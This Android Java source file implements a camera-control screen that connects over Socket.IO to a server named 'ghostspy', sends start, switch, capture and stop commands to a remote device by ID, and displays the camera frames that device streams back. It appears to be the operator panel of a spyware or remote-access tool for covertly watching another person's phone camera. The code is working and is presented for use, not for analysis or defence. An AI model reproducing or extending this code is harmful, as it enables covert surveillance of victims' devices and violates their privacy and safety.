package com.testapp;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.util.Base64;
import android.view.Gravity;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class CameraActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private ImageView cameraView;
    private Button switchBtn, captureBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF080808);
        root.setPadding(16, 16, 16, 16);

        // Header
        TextView title = new TextView(this);
        title.setText("📷 Kamera");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        root.addView(title);

        // Kamera view
        cameraView = new ImageView(this);
        cameraView.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams camParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 600);
        camParams.setMargins(0, 16, 0, 16);
        cameraView.setLayoutParams(camParams);
        cameraView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        root.addView(cameraView);

        // Tombol kontrol
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        switchBtn = new Button(this);
        switchBtn.setText("🔄 Switch");
        switchBtn.setTextColor(0xFFFFFFFF);
        switchBtn.setBackgroundColor(0xFF151515);
        switchBtn.setOnClickListener(v -> sendCmd("switch_camera"));
        btnRow.addView(switchBtn);

        captureBtn = new Button(this);
        captureBtn.setText("📸 Capture");
        captureBtn.setTextColor(0xFFFFFFFF);
        captureBtn.setBackgroundColor(0xFFFF1744);
        captureBtn.setOnClickListener(v -> sendCmd("capture_camera"));
        btnRow.addView(captureBtn);

        root.addView(btnRow);
        setContentView(root);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("camera_frame", args -> {
            try {
                String b64 = (String) args[0];
                byte[] img = Base64.decode(b64, Base64.DEFAULT);
                Bitmap bmp = BitmapFactory.decodeByteArray(img, 0, img.length);
                runOnUiThread(() -> cameraView.setImageBitmap(bmp));
            } catch (Exception e) {}
        });

        // Mulai kamera
        sendCmd("start_camera");
    }

    private void sendCmd(String cmd) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
            } catch (Exception e) {}
        }
    }

    @Override
    protected void onDestroy() {
        sendCmd("stop_camera");
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
